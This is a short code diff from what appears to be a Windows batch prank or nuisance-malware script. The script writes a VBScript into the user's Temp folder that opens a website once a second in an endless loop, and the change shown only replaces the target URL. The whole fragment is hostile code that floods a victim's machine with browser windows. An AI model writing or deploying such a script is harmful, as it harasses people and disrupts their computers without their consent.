@@ -79,7 +79,7 @@ cd %systemdrive%\Users\%USERNAME%\AppData\Local\Temp
 @echo do>>%twitch%.vbs
 @echo Dim wsh>>%twitch%.vbs
 @echo Set wsh=WScript.CreateObject("WScript.Shell")>>%twitch%.vbs
-@echo wsh.Run "http://p0wned.github.io/">>%twitch%.vbs
+@echo wsh.Run "https://mrparadoxal.github.io">>%twitch%.vbs
 @echo WScript.Sleep 1000>>%twitch%.vbs
 @echo loop>>%twitch%.vbs
 
